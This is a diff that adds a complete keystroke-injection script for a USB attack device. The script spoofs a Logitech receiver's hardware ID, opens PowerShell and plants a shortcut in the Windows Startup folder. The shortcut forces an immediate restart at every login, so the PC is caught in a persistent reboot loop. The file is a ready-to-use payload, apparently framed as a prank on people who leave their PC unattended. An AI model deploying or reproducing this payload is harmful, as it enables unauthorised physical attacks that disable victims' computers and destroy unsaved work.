@@ -1,0 +1,15 @@
+REM Links shutdown.exe (Restart) to Startup folder
+
+REM Simulate Logitech USB receiver
+DELAY 1000
+ID 046D:C52B Logitech:USB Receiver
+
+REM Start PowerShell
+DELAY 500
+GUI r
+DELAY 500
+STRINGLN powershell
+DELAY 3000
+
+REM Create a shutdown link to Startup folder
+STRINGLN $ws=New-Object -ComObject WScript.Shell;$s=$ws.CreateShortcut($ws.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\I left my PC unattended.lnk"));$s.TargetPath="C:\Windows\System32\shutdown.exe";$s.Arguments="/r /f /t 0";$s.Save();exit
